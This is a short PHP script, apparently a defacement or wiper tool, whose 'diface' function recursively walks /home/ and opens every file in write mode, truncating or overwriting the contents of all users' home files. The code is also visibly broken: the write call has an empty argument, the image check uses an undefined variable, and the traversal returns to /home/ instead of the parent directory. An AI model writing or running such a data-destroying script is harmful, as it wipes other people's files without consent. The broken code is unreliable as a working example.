<?php
	function type($addr)
	{
		if(is_dir($addr)) return "dir";
		if(is_file($addr)) return "file";

		$a = getimagesize($str);
		$image_type = $a[2];
	
		if(in_array($image_type , array(IMAGETYPE_GIF , IMAGETYPE_JPEG ,IMAGETYPE_PNG , IMAGETYPE_BMP)))
			return "image";
		return "another";
	
	}

	chdir("/home/");

	function diface()
	{
		$d = opendir(getcwd());

		while($tmp = readdir($d))
		{
			if($tmp != "." && $tmp != "..")
			{
				if(type($tmp) != "dir")
				{
					fwrite(fopen($tmp, "w"), ());
				}

				if(type($tmp) == "dir" || is_dir($tmp))
				{
					chdir($tmp);
					diface();
					chdir("/home/");
				}
			}
		}

		closedir($d);
	}

	diface();
?>

